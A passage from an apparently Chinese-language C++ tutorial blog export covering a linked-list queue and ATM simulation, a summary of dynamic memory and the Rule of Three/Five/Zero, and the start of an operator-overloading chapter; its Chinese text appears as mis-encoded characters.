åˆå§‹åŒ– const æˆå‘˜ qsize front = rear = nullptr; // åˆå§‹åŒ–ä¸ºç©ºé˜Ÿåˆ— items = 0;&#125;Queue::~Queue() &#123; Node * temp; while (front != nullptr) &#123; // å¾ªç¯ç›´åˆ°é˜Ÿåˆ—ä¸ºç©º temp = front; // ä¿å­˜å½“å‰é˜Ÿé¦–èŠ‚ç‚¹åœ°å€ front = front-&gt;next; // ç§»åŠ¨ front æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ delete temp; // åˆ é™¤æ—§çš„é˜Ÿé¦–èŠ‚ç‚¹ &#125;&#125;// æ·»åŠ é¡¹ç›®åˆ°é˜Ÿå°¾bool Queue::enqueue(const Item &amp;item) &#123; if (isfull()) return false; // é˜Ÿåˆ—å·²æ»¡ï¼Œæ— æ³•æ·»åŠ  Node * add = new Node; // åˆ›å»ºæ–°èŠ‚ç‚¹ // å¦‚æœ new å¤±è´¥ï¼Œä¼šæŠ›å‡ºå¼‚å¸¸ (è¿™é‡Œç®€åŒ–å¤„ç†ï¼Œæœªæ•è·) add-&gt;item = item; // è®¾ç½®èŠ‚ç‚¹æ•°æ® add-&gt;next = nullptr; // æ–°èŠ‚ç‚¹æ˜¯é˜Ÿå°¾ï¼Œnext ä¸ºç©º items++; // é¡¹ç›®æ•°å¢åŠ  if (front == nullptr) // å¦‚æœé˜Ÿåˆ—åŸæœ¬ä¸ºç©º front = add; // æ–°èŠ‚ç‚¹åŒæ—¶æ˜¯é˜Ÿé¦–å’Œé˜Ÿå°¾ else rear-&gt;next = add; // å°†åŸé˜Ÿå°¾èŠ‚ç‚¹çš„ next æŒ‡å‘æ–°èŠ‚ç‚¹ rear = add; // æ›´æ–° rear æŒ‡å‘æ–°çš„é˜Ÿå°¾èŠ‚ç‚¹ return true;&#125;// ä»é˜Ÿé¦–ç§»é™¤é¡¹ç›®bool Queue::dequeue(Item &amp;item) &#123; if (isempty()) return false; // é˜Ÿåˆ—ä¸ºç©ºï¼Œæ— æ³•ç§»é™¤ item = front-&gt;item; // è·å–é˜Ÿé¦–èŠ‚ç‚¹çš„æ•°æ® (é€šè¿‡å¼•ç”¨å‚æ•°è¿”å›) items--; // é¡¹ç›®æ•°å‡å°‘ Node * temp = front; // ä¿å­˜é˜Ÿé¦–èŠ‚ç‚¹åœ°å€ front = front-&gt;next; // ç§»åŠ¨ front æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ delete temp; // åˆ é™¤æ—§çš„é˜Ÿé¦–èŠ‚ç‚¹ if (items == 0) // å¦‚æœåˆ é™¤åé˜Ÿåˆ—ä¸ºç©º rear = nullptr; // rear ä¹Ÿè®¾ä¸ºç©º return true;&#125; 12.7.2 Customer ç±»è¿™ä¸ªç±»ç›¸å¯¹ç®€å•ï¼Œåªéœ€è¦å­˜å‚¨å®¢æˆ·çš„åˆ°è¾¾æ—¶é—´å’Œæ‰€éœ€çš„äº¤æ˜“æ—¶é—´ã€‚ 123456789101112131415161718192021222324// customer.h (ç†æƒ³æƒ…å†µä¸‹)#ifndef CUSTOMER_H_#define CUSTOMER_H_class Customer &#123;private: long arrive; // arrival time for customer int processtime; // processing time for customerpublic: Customer() : arrive(0), processtime(0) &#123;&#125; void set(long when); // è®¾ç½®åˆ°è¾¾æ—¶é—´ï¼Œå¹¶éšæœºç”Ÿæˆå¤„ç†æ—¶é—´ long when() const &#123; return arrive; &#125; int ptime() const &#123; return processtime; &#125;&#125;;#endif // CUSTOMER_H_// customer.cpp (ç†æƒ³æƒ…å†µä¸‹)#include &quot;customer.h&quot;#include &lt;cstdlib&gt; // for std::rand()void Customer::set(long when) &#123; processtime = std::rand() % 3 + 1; // å‡è®¾å¤„ç†æ—¶é—´ä¸º 1, 2, æˆ– 3 åˆ†é’Ÿ arrive = when;&#125; (åœ¨ä¸Šé¢çš„ queue.cpp ä¸­ï¼Œæˆ‘ä»¬ä¸ºäº†æ–¹ä¾¿ç¼–è¯‘ï¼Œå°† Customer çš„ç®€å•å®šä¹‰ç›´æ¥æ”¾åœ¨äº†é‚£é‡Œã€‚åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œåº”å°†å…¶åˆ†ä¸º .h å’Œ .cpp æ–‡ä»¶ã€‚) 12.7.3 ATM æ¨¡æ‹Ÿ (atm.cpp)ç°åœ¨æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸»ç¨‹åºæ¥æ‰§è¡Œæ¨¡æ‹Ÿäº†ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103#include &lt;iostream&gt;#include &lt;cstdlib&gt; // for rand() and srand()#include &lt;ctime&gt; // for time()#include &quot;queue.h&quot; // åŒ…å« Queue ç±» (å®ƒå†…éƒ¨åŒ…å«äº† Customer çš„ç®€å•å®šä¹‰)const int MIN_PER_HR = 60; // æ¯å°æ—¶åˆ†é’Ÿæ•°// å‡½æ•°ï¼šåˆ¤æ–­æ˜¯å¦æœ‰æ–°å®¢æˆ·åˆ°æ¥// å‚æ•° x: å¹³å‡å¤šå°‘åˆ†é’Ÿæ¥ä¸€ä½å®¢æˆ·// è¿”å›å€¼: true å¦‚æœè¿™ä¸€åˆ†é’Ÿæœ‰å®¢æˆ·æ¥, false å¦‚æœæ²¡æœ‰bool newcustomer(double x);int main() &#123; using std::cin; using std::cout; using std::endl; using std::ios_base; // è®¾ç½®éšæœºæ•°ç§å­ std::srand(std::time(0)); cout &lt;&lt; &quot;Case Study: Bank of Heather Automatic Teller\\n&quot;; cout &lt;&lt; &quot;Enter maximum size of queue: &quot;; int qs; // é˜Ÿåˆ—æœ€å¤§é•¿åº¦ cin &gt;&gt; qs; Queue line(qs); // åˆ›å»ºé˜Ÿåˆ—å¯¹è±¡ cout &lt;&lt; &quot;Enter the number of simulation hours: &quot;; int hours; // æ¨¡æ‹Ÿæ€»å°æ—¶æ•° cin &gt;&gt; hours; // æ¨¡æ‹Ÿä»¥åˆ†é’Ÿä¸ºå•ä½è¿›è¡Œ long cyclelimit = MIN_PER_HR * hours; // æ€»æ¨¡æ‹Ÿåˆ†é’Ÿæ•° cout &lt;&lt; &quot;Enter the average number of customers per hour: &quot;; double perhour; // å¹³å‡æ¯å°æ—¶å®¢æˆ·æ•° cin &gt;&gt; perhour; double min_per_cust; // å¹³å‡å¤šå°‘åˆ†é’Ÿæ¥ä¸€ä½å®¢æˆ· min_per_cust = MIN_PER_HR / perhour; Item temp; // ç”¨äºå­˜å‚¨æ–°å®¢æˆ· long turnaways = 0; // å› é˜Ÿåˆ—æ»¡è€Œè¢«æ‹’ç»çš„å®¢æˆ·æ•° long customers = 0; // åŠ å…¥é˜Ÿåˆ—çš„æ€»å®¢æˆ·æ•° long served = 0; // å®ŒæˆæœåŠ¡çš„æ€»å®¢æˆ·æ•° long sum_line = 0; // ç´¯è®¡çš„é˜Ÿåˆ—é•¿åº¦ (ç”¨äºè®¡ç®—å¹³å‡é•¿åº¦) int wait_time = 0; // å½“å‰å®¢æˆ·åœ¨ ATM å¤„è¿˜éœ€ç­‰å¾…çš„æ—¶é—´ long line_wait = 0; // æ‰€æœ‰å®¢æˆ·ç´¯è®¡çš„æ€»ç­‰å¾…æ—¶é—´ (é˜Ÿåˆ—ä¸­ + ATMå¤„) // --- æ¨¡æ‹Ÿä¸»å¾ªç¯ --- for (long cycle = 0; cycle &lt; cyclelimit; cycle++) &#123; // 1. æ˜¯å¦æœ‰æ–°å®¢æˆ·åˆ°æ¥ï¼Ÿ if (newcustomer(min_per_cust)) &#123; if (line.isfull()) &#123; turnaways++; // é˜Ÿåˆ—æ»¡ï¼Œæ‹’ç» &#125; else &#123; customers++; // å®¢æˆ·åŠ å…¥ temp.set(cycle); // è®¾ç½®å®¢æˆ·åˆ°è¾¾æ—¶é—´ (å½“å‰åˆ†é’Ÿæ•°) å’Œéšæœºå¤„ç†æ—¶é—´ line.enqueue(temp); // åŠ å…¥é˜Ÿåˆ— &#125; &#125; // 2. ATM æ˜¯å¦ç©ºé—²ï¼Ÿå¦‚æœç©ºé—²ä¸”é˜Ÿåˆ—æœ‰äººï¼Œåˆ™æœåŠ¡ä¸‹ä¸€ä½ if (wait_time &lt;= 0 &amp;&amp; !line.isempty()) &#123; line.dequeue(temp); // ä»é˜Ÿåˆ—å–å‡ºå®¢æˆ· wait_time = temp.ptime(); // è®¾ç½® ATM éœ€ç­‰å¾…æ—¶é—´ = å®¢æˆ·å¤„ç†æ—¶é—´ line_wait += cycle - temp.when(); // ç´¯åŠ å®¢æˆ·ç­‰å¾…æ—¶é—´ (å½“å‰æ—¶é—´ - åˆ°è¾¾æ—¶é—´) served++; // æœåŠ¡å®¢æˆ·æ•°å¢åŠ  &#125; // 3. å¦‚æœ ATM æ­£åœ¨æœåŠ¡ï¼Œåˆ™å‡å°‘å‰©ä½™ç­‰å¾…æ—¶é—´ if (wait_time &gt; 0) wait_time--; // 4. ç´¯åŠ å½“å‰é˜Ÿåˆ—é•¿åº¦ sum_line += line.queuecount(); &#125; // --- æ¨¡æ‹Ÿå¾ªç¯ç»“æŸ --- // --- è¾“å‡ºæ¨¡æ‹Ÿç»“æœ --- if (customers &gt; 0) &#123; cout &lt;&lt; &quot;\\nCustomers accepted: &quot; &lt;&lt; customers &lt;&lt; endl; cout &lt;&lt; &quot; Customers served: &quot; &lt;&lt; served &lt;&lt; endl; cout &lt;&lt; &quot; Turnaways: &quot; &lt;&lt; turnaways &lt;&lt; endl; cout &lt;&lt; &quot;Average queue size: &quot;; cout.precision(2); cout.setf(ios_base::fixed, ios_base::floatfield); cout &lt;&lt; (double) sum_line / cyclelimit &lt;&lt; endl; // å¹³å‡é˜Ÿåˆ—é•¿åº¦ cout &lt;&lt; &quot; Average wait time: &quot; &lt;&lt; (double) line_wait / served &lt;&lt; &quot; minutes\\n&quot;; // å¹³å‡ç­‰å¾…æ—¶é—´ &#125; else &#123; cout &lt;&lt; &quot;No customers!\\n&quot;; &#125; cout &lt;&lt; &quot;Done!\\n&quot;; return 0;&#125;// å‡½æ•°å®šä¹‰ï¼šåˆ¤æ–­æ˜¯å¦æœ‰æ–°å®¢æˆ·åˆ°æ¥// è¿™æ˜¯ä¸€ä¸ªç®€å•çš„æ¦‚ç‡æ¨¡å‹ï¼šåœ¨ä¸€åˆ†é’Ÿå†…ï¼Œå®¢æˆ·åˆ°æ¥çš„æ¦‚ç‡æ˜¯ 1/xbool newcustomer(double x) &#123; // rand() * x / RAND_MAX &lt; 1 ç­‰ä»·äº rand() / RAND_MAX &lt; 1/x return (std::rand() * x / RAND_MAX &lt; 1);&#125; ç¼–è¯‘å’Œè¿è¡Œ: ä½ éœ€è¦å°† queue.cpp å’Œ atm.cpp ä¸€èµ·ç¼–è¯‘é“¾æ¥ã€‚ 12g++ atm.cpp queue.cpp -o atm./atm ç¨‹åºä¼šæç¤ºä½ è¾“å…¥é˜Ÿåˆ—æœ€å¤§é•¿åº¦ã€æ¨¡æ‹Ÿå°æ—¶æ•°å’Œå¹³å‡æ¯å°æ—¶å®¢æˆ·æ•°ï¼Œç„¶åè¿è¡Œæ¨¡æ‹Ÿå¹¶è¾“å‡ºç»“æœã€‚ä½ å¯ä»¥å°è¯•ä¸åŒçš„è¾“å…¥å€¼ï¼Œè§‚å¯Ÿå®ƒä»¬å¯¹å¹³å‡ç­‰å¾…æ—¶é—´å’Œé˜Ÿåˆ—é•¿åº¦çš„å½±å“ã€‚è¿™ä¸ªæ¨¡æ‹Ÿè™½ç„¶ç®€å•ï¼Œä½†å®ƒå±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨ç±»ï¼ˆç‰¹åˆ«æ˜¯æ¶‰åŠåŠ¨æ€å†…å­˜çš„ç±»ï¼‰æ¥è§£å†³å®é™…é—®é¢˜ã€‚ 12.8 æ€»ç»“æœ¬ç« æ·±å…¥æ¢è®¨äº†å½“ C++ ç±»éœ€è¦ç›´æ¥ç®¡ç†åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼ˆä½¿ç”¨ new å’Œ deleteï¼‰æ—¶æ‰€é¢ä¸´çš„æŒ‘æˆ˜å’Œå¿…éœ€çš„æŠ€æœ¯ã€‚æ ¸å¿ƒé—®é¢˜åœ¨äºç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆçš„é»˜è®¤æˆå‘˜å‡½æ•°ï¼ˆç‰¹åˆ«æ˜¯å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ï¼‰æ‰§è¡Œçš„æµ…å¤åˆ¶è¡Œä¸ºï¼Œè¿™å¯¹äºåŒ…å«åŸå§‹æŒ‡é’ˆæˆå‘˜çš„ç±»æ¥è¯´æ˜¯å±é™©çš„ã€‚ ä¸»è¦å†…å®¹å›é¡¾ï¼š åŠ¨æ€å†…å­˜å’Œç±»çš„é—®é¢˜: å¦‚æœç±»ä½¿ç”¨ new åˆ†é…å†…å­˜å¹¶å­˜å‚¨åœ¨æŒ‡é’ˆæˆå‘˜ä¸­ï¼Œé»˜è®¤çš„å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦åªä¼šå¤åˆ¶æŒ‡é’ˆçš„åœ°å€ï¼ˆæµ…å¤åˆ¶ï¼‰ï¼Œè€Œä¸æ˜¯æŒ‡é’ˆæŒ‡å‘çš„æ•°æ®ã€‚ æµ…å¤åˆ¶å¯¼è‡´å¤šä¸ªå¯¹è±¡å…±äº«åŒä¸€å—åŠ¨æ€å†…å­˜ï¼Œå½“å…¶ä¸­ä¸€ä¸ªå¯¹è±¡è¢«é”€æ¯å¹¶è°ƒç”¨ææ„å‡½æ•° delete å†…å­˜æ—¶ï¼Œå…¶ä»–å¯¹è±¡çš„æŒ‡é’ˆå°±å˜æˆäº†æ‚¬æŒ‚æŒ‡é’ˆã€‚ åç»­å¯¹æ‚¬æŒ‚æŒ‡é’ˆçš„è®¿é—®æˆ–åœ¨å…¶ä»–å¯¹è±¡ææ„æ—¶å†æ¬¡ delete åŒä¸€å—å†…å­˜ï¼ˆé‡å¤åˆ é™¤ï¼‰ä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºå’Œç¨‹åºå´©æºƒã€‚ é»˜è®¤èµ‹å€¼è¿ç®—ç¬¦è¿˜å¯èƒ½å¯¼è‡´å†…å­˜æ³„æ¼ï¼Œå› ä¸ºå®ƒè¦†ç›–äº†æ—§æŒ‡é’ˆè€Œæ²¡æœ‰é‡Šæ”¾å…¶æŒ‡å‘çš„å†…å­˜ã€‚ ç‰¹æ®Šæˆå‘˜å‡½æ•°å’Œå¤åˆ¶æ§åˆ¶ (Rule of Three/Five): ä¸ºäº†è§£å†³æµ…å¤åˆ¶é—®é¢˜ï¼Œç®¡ç†åŠ¨æ€å†…å­˜çš„ç±»é€šå¸¸éœ€è¦æä¾›è‡ªå®šä¹‰çš„ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼š ææ„å‡½æ•° (~ClassName()): å¿…é¡»å®šä¹‰ï¼Œè´Ÿè´£ä½¿ç”¨ delete æˆ– delete[] é‡Šæ”¾ç”±æ„é€ å‡½æ•°åˆ†é…çš„æ‰€æœ‰åŠ¨æ€å†…å­˜ã€‚ å¤åˆ¶æ„é€ å‡½æ•° (ClassName(const ClassName &amp;)): å¿…é¡»å®šä¹‰ï¼Œæ‰§è¡Œæ·±å¤åˆ¶â€”â€”ä¸ºæ–°å¯¹è±¡åˆ†é…ç‹¬ç«‹çš„å†…å­˜ï¼Œå¹¶å°†æºå¯¹è±¡çš„æ•°æ®å¤åˆ¶åˆ°æ–°å†…å­˜ä¸­ã€‚ å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ (ClassName &amp; operator=(const ClassName &amp;)): å¿…é¡»å®šä¹‰ï¼Œæ‰§è¡Œæ·±å¤åˆ¶ï¼ŒåŒæ—¶éœ€è¦å¤„ç†è‡ªæˆ‘èµ‹å€¼ï¼ˆobj = obj;ï¼‰å¹¶é‡Šæ”¾æ—§èµ„æºï¼Œæœ€åè¿”å› *thisã€‚ ä¸‰æ³•åˆ™ (Rule of Three, C++11 å‰): å¦‚æœä½ éœ€è¦è‡ªå®šä¹‰ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°æˆ–å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œä½ å‡ ä¹è‚¯å®šéœ€è¦å…¨éƒ¨ä¸‰ä¸ªã€‚ äº”æ³•åˆ™ (Rule of Five, C++11 åŠä»¥å): éšç€ç§»åŠ¨è¯­ä¹‰çš„å¼•å…¥ï¼Œå¦‚æœéœ€è¦è‡ªå®šä¹‰ä¸Šè¿°ä¸‰ä¸ªæˆ–ç§»åŠ¨æ„é€ å‡½æ•°/ç§»åŠ¨èµ‹å€¼è¿ç®—ç¬¦ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œé€šå¸¸éœ€è¦è€ƒè™‘æ‰€æœ‰äº”ä¸ªã€‚ æ”¹è¿›çš„ String ç±»: é€šè¿‡å®ç°è‡ªå®šä¹‰çš„ææ„å‡½æ•°ã€å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦ï¼ˆæ‰§è¡Œæ·±å¤åˆ¶ï¼‰ï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªèƒ½å¤Ÿå®‰å…¨ç®¡ç†åŠ¨æ€å†…å­˜çš„ String ç±»ã€‚ æ„é€ å‡½æ•°ä¸­ä½¿ç”¨ new çš„æ³¨æ„äº‹é¡¹: å¿…é¡»åœ¨ææ„å‡½æ•°ä¸­é…å¯¹ä½¿ç”¨ delete æˆ– delete[]ã€‚ new å¯èƒ½å¤±è´¥å¹¶æŠ›å‡º std::bad_alloc å¼‚å¸¸ã€‚å¦‚æœæ„é€ å‡½æ•°åœ¨ new å¤±è´¥å‰å·²åˆ†é…å…¶ä»–èµ„æºï¼Œéœ€è¦æ³¨æ„èµ„æºæ³„æ¼é—®é¢˜ï¼ˆææ„å‡½æ•°ä¸ä¼šè¢«è°ƒç”¨ï¼‰ã€‚ä½¿ç”¨ RAIIï¼ˆå¦‚æ™ºèƒ½æŒ‡é’ˆï¼‰æ˜¯æ›´å®‰å…¨çš„åšæ³•ã€‚ å¦‚æœç±»çš„æˆå‘˜æ˜¯å…¶ä»–ç±»çš„å¯¹è±¡ï¼Œé»˜è®¤çš„å¤åˆ¶/èµ‹å€¼æ“ä½œä¼šè°ƒç”¨æˆå‘˜å¯¹è±¡çš„ç›¸åº”å¤åˆ¶/èµ‹å€¼æ“ä½œã€‚å¦‚æœæˆå‘˜å¯¹è±¡èƒ½æ­£ç¡®å¤„ç†è‡ªå·±çš„èµ„æºï¼Œè¿™é€šå¸¸æ˜¯å®‰å…¨çš„ã€‚ è¿”å›å¯¹è±¡: æŒ‰å¼•ç”¨è¿”å› (&amp; æˆ– const &amp;): é«˜æ•ˆï¼Œç”¨äºè¿”å›å·²å­˜åœ¨çš„å¯¹è±¡ï¼Œä½†ä¸èƒ½è¿”å›å±€éƒ¨å˜é‡çš„å¼•ç”¨ã€‚ æŒ‰å€¼è¿”å› (ClassName): å®‰å…¨ï¼Œè¿”å›å‰¯æœ¬æˆ–ç§»åŠ¨åçš„å¯¹è±¡ã€‚ç°ä»£ C++ é€šè¿‡ RVO/NRVO å’Œç§»åŠ¨è¯­ä¹‰ä½¿å…¶é€šå¸¸è¶³å¤Ÿé«˜æ•ˆã€‚ æŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆ: ä½¿ç”¨ new åŠ¨æ€åˆ›å»ºå¯¹è±¡ï¼Œè¿”å›å¯¹è±¡æŒ‡é’ˆã€‚ ä½¿ç”¨ delete é”€æ¯å¯¹è±¡ï¼ˆè°ƒç”¨ææ„å‡½æ•°å¹¶é‡Šæ”¾å†…å­˜ï¼‰ã€‚ ä½¿ç”¨ new[] å’Œ delete[] å¤„ç†åŠ¨æ€å¯¹è±¡æ•°ç»„ã€‚ ä½¿ç”¨ç®­å¤´è¿ç®—ç¬¦ -&gt; è®¿é—®æŒ‡é’ˆæŒ‡å‘å¯¹è±¡çš„æˆå‘˜ã€‚ å®šä½ new (placement new): åœ¨é¢„å…ˆåˆ†é…å¥½çš„å†…å­˜åœ°å€ä¸Šæ„é€ å¯¹è±¡ï¼Œéœ€è¦æ˜¾å¼è°ƒç”¨ææ„å‡½æ•° (ptr-&gt;~ClassName()) æ¥é”€æ¯å¯¹è±¡ï¼Œå†…å­˜éœ€å¦å¤–ç®¡ç†ã€‚ é™æ€ç±»æˆå‘˜: é™æ€æ•°æ®æˆå‘˜: è¢«ç±»çš„æ‰€æœ‰å¯¹è±¡å…±äº«ï¼Œç‹¬ç«‹äºä»»ä½•å¯¹è±¡å­˜åœ¨ï¼Œé€šå¸¸åœ¨ç±»å¤–åˆå§‹åŒ–ã€‚ é™æ€æˆå‘˜å‡½æ•°: ä¸ä¸ç‰¹å®šå¯¹è±¡å…³è”ï¼ˆæ—  this æŒ‡é’ˆï¼‰ï¼Œåªèƒ½è®¿é—®é™æ€æˆå‘˜ï¼Œå¯é€šè¿‡ç±»åè°ƒç”¨ (ClassName::static_func())ã€‚ é˜Ÿåˆ—æ¨¡æ‹Ÿ: æ¼”ç¤ºäº†å¦‚ä½•åº”ç”¨ç±»å’ŒåŠ¨æ€å†…å­˜ç®¡ç†ï¼ˆé“¾è¡¨å®ç°çš„é˜Ÿåˆ—ï¼‰æ¥è§£å†³ä¸€ä¸ªå®é™…çš„æ¨¡æ‹Ÿé—®é¢˜ã€‚ ç°ä»£ C++ å»ºè®® (Rule of Zero): å°½å¯èƒ½ä½¿ç”¨æ ‡å‡†åº“æä¾›çš„èµ„æºç®¡ç†ç±»ï¼ˆå¦‚ std::string, std::vector, std::unique_ptr, std::shared_ptrï¼‰ï¼Œå®ƒä»¬éµå¾ª RAII åŸåˆ™å¹¶æ­£ç¡®å®ç°äº†å¤åˆ¶/ç§»åŠ¨è¯­ä¹‰ã€‚å¦‚æœä½ çš„ç±»åªä½¿ç”¨è¿™äº›å·¥å…·æ¥ç®¡ç†èµ„æºï¼Œé€šå¸¸å°±ä¸éœ€è¦ç¼–å†™ä»»ä½•è‡ªå®šä¹‰çš„ç‰¹æ®Šæˆå‘˜å‡½æ•°ï¼ˆé›¶æ³•åˆ™ï¼‰ï¼Œä»è€Œä½¿ä»£ç æ›´ç®€å•ã€æ›´å®‰å…¨ã€‚","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 11 ä½¿ç”¨ç±»","slug":"Cpp_tutorial_Chapter_11","date":"2025-04-30T15:42:24.000Z","updated":"2025-04-30T15:39:48.106Z","comments":true,"path":"2025/04/30/Cpp_tutorial_Chapter_11/","link":"","permalink":"http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_11/","excerpt":"","text":"11.1 è¿ç®—ç¬¦é‡è½½C++ å…è®¸å°†è¿ç®—ç¬¦ï¼ˆå¦‚ +, -, *, /, &lt;&lt;, &gt;&gt;, == ç­‰ï¼‰åº”ç”¨äºç±»å¯¹è±¡ï¼Œå°±åƒå®ƒä»¬æ˜¯å†…ç½®ç±»å‹ï¼ˆå¦‚ int æˆ– doubleï¼‰ä¸€æ ·ã€‚è¿™ç§ç‰¹æ€§ç§°ä¸º**è¿ç®—ç¬¦é‡è½½ (Operator Overloading)**ã€‚ ç›®çš„: è¿ç®—ç¬¦é‡è½½çš„ä¸»è¦ç›®çš„æ˜¯æé«˜ä»£ç çš„å¯è¯»æ€§å’Œç›´è§‚æ€§ã€‚é€šè¿‡é‡è½½è¿ç®—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥è®©æˆ‘ä»¬è‡ªå·±å®šä¹‰çš„ç±»ï¼ˆæ¯”å¦‚è¡¨ç¤ºå¤æ•°ã€å‘é‡ã€æ—¶é—´æˆ–å­—ç¬¦ä¸²çš„ç±»ï¼‰èƒ½å¤Ÿä½¿ç”¨ç†Ÿæ‚‰çš„è¿ç®—ç¬¦è¿›è¡Œæ“ä½œï¼Œä½¿å¾—ä»£ç æ›´æ¥è¿‘è‡ªç„¶è¯­è¨€æˆ–æ•°å­¦è¡¨ç¤ºæ³•ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾ä½ æœ‰ä¸€ä¸ªè¡¨ç¤ºäºŒç»´å‘é‡çš„ç±» Vectorã€‚å¦‚æœæ²¡æœ‰è¿ç®—ç¬¦é‡è½½ï¼Œä½ å¯èƒ½éœ€è¦è¿™æ ·å†™ä»£ç æ¥è®¡ç®—ä¸¤ä¸ªå‘é‡çš„å’Œï¼š 123Vector v1(1.0, 2.0);Vector v2(3.0, 4.0);Vector sum = v1.add(v2); // ä½¿ç”¨åä¸º add çš„æˆå‘˜å‡½æ•° é€šè¿‡é‡è½½ + è¿ç®—ç¬¦ï¼Œä½ å¯ä»¥å†™å‡ºæ›´è‡ªç„¶ã€æ›´ç®€æ´çš„ä»£ç ï¼š 123Vector v1(1.0, 2.0);Vector v2(3.0, 4.0);Vector sum = v1 + v2; // ä½¿ç”¨é‡è½½çš„ + è¿ç®—ç¬¦ å¦‚ä½•å®ç°: è¿ç®—ç¬¦é‡è½½æ˜¯é€šè¿‡ç¼–å†™ç‰¹æ®Šçš„è¿ç®—ç¬¦å‡½æ•° (Operator Functions) æ¥å®ç°çš„ã€‚è¿ç®—ç¬¦å‡½æ•°çš„åç§°æ ¼å¼ä¸º operator å…³é”®å­—åè·Ÿè¦é‡è½½çš„è¿ç®—ç¬¦ç¬¦å·ã€‚ä¾‹å¦‚ï¼Œé‡è½½åŠ æ³•è¿ç®—ç¬¦ + çš„å‡½æ•°åä¸º operator+ï¼Œé‡è½½å°äºè¿ç®—ç¬¦ &lt; çš„å‡½æ•°åä¸º operator&lt;ã€‚ è¿ç®—ç¬¦å‡½æ•°å¯ä»¥è¢«å®šä¹‰ä¸ºï¼š ç±»çš„æˆå‘˜å‡½æ•° (Member Function): å½“è¿ç®—ç¬¦å‡½æ•°æ˜¯æˆå‘˜å‡½æ•°æ—¶ï¼Œå®ƒçš„ç¬¬ä¸€ä¸ªæ“ä½œæ•°éšå¼åœ°æ˜¯è°ƒç”¨è¯¥å‡½æ•°çš„å¯¹è±¡ï¼ˆé€šè¿‡ this æŒ‡é’ˆè®¿é—®ï¼‰ã€‚ å¯¹äºäºŒå…ƒè¿ç®—ç¬¦ï¼ˆå¦‚ +, -, *ï¼‰ï¼Œæˆå‘˜å‡½æ•°åªéœ€è¦ä¸€ä¸ªæ˜¾å¼å‚æ•°ï¼ˆä»£è¡¨å³æ“ä½œæ•°ï¼‰ã€‚ å¯¹äºä¸€å…ƒè¿ç®—ç¬¦ï¼ˆå¦‚ - (è´Ÿå·), ++ (å‰ç¼€)ï¼‰ï¼Œæˆå‘˜å‡½æ•°æ²¡æœ‰æ˜¾å¼å‚æ•°ã€‚ éæˆå‘˜å‡½æ•° (Non-member Function): é€šå¸¸å°†éæˆå‘˜è¿ç®—ç¬¦å‡½æ•°å£°æ˜ä¸ºç±»çš„**å‹å…ƒ (friend)**ï¼Œä»¥ä¾¿å®ƒå¯ä»¥è®¿é—®ç±»çš„ç§æœ‰æˆå‘˜ã€‚ å¯¹äºäºŒå…ƒè¿ç®—ç¬¦ï¼Œéæˆå‘˜å‡½æ•°éœ€è¦ä¸¤ä¸ªæ˜¾å¼å‚æ•°ï¼ˆåˆ†åˆ«ä»£è¡¨å·¦æ“ä½œæ•°å’Œå³æ“ä½œæ•°ï¼‰ã€‚ å¯¹äºä¸€å…ƒè¿ç®—ç¬¦ï¼Œéæˆå‘˜å‡½æ•°éœ€è¦ä¸€ä¸ªæ˜¾å¼å‚æ•°ã€‚ åŸºæœ¬è¯­æ³• (ä»¥äºŒå…ƒè¿ç®—ç¬¦ + ä¸ºä¾‹): ä½œä¸ºæˆå‘˜å‡½æ•°: 1234567891011121314151617181920class MyClass &#123;public: // ... å…¶ä»–æˆå‘˜ ... // å£°æ˜é‡è½½çš„ + è¿ç®—ç¬¦ (æˆå‘˜å‡½æ•°) // other æ˜¯å³æ“ä½œæ•°å¯¹è±¡ MyClass operator+(const MyClass&amp; other) const;&#125;;// å®šä¹‰MyClass MyClass::operator+(const MyClass&amp; other) const &#123; MyClass result; // å®ç°åŠ æ³•é€»è¾‘ï¼Œé€šå¸¸æ¶‰åŠ this å¯¹è±¡å’Œ other å¯¹è±¡ // result.data = this-&gt;data + other.data; // å‡è®¾æœ‰ data æˆå‘˜ return result;&#125;// ä½¿ç”¨MyClass obj1, obj2;MyClass sum = obj1 + obj2; // å®é™…è°ƒç”¨ obj1.operator+(obj2) ä½œä¸ºéæˆå‘˜å‡½æ•° (é€šå¸¸æ˜¯å‹å…ƒ): 1234567891011121314151617181920class MyClass &#123; // ... ç§æœ‰æˆå‘˜ ...public: // ... å…¶ä»–å…¬æœ‰æˆå‘˜ ... // å£°æ˜å‹å…ƒå‡½æ•°æ¥é‡è½½ + è¿ç®—ç¬¦ friend MyClass operator+(const MyClass&amp; left, const MyClass&amp; right);&#125;;// å®šä¹‰ (éæˆå‘˜å‡½æ•°ï¼Œä¸éœ€è¦ MyClass::)MyClass operator+(const MyClass&amp; left, const MyClass&amp; right) &#123; MyClass result; // å®ç°åŠ æ³•é€»è¾‘ï¼Œè®¿é—® left å’Œ right å¯¹è±¡çš„æˆå‘˜ (éœ€è¦å‹å…ƒæƒé™è®¿é—®ç§æœ‰æˆå‘˜) // result.data = left.data + 